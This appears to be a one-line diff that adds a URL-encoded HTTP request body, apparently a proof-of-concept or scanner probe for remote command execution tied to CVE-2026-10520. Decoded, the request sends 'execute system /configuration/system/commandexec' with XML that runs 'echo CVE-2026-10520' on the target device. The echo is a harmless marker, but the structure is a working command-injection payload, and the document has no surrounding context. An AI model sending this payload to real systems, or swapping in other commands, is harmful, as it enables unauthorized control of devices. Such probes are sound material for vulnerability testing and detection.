@@ -1,0 +1,1 @@
+message=execute%20system%20%2fconfiguration%2fsystem%2fcommandexec%20%3ccommandexec%3e%3cindex%3e1%3c%2findex%3e%3creqandres%3eecho%20CVE-2026-10520%3c%2freqandres%3e%3c%2fcommandexec%3e
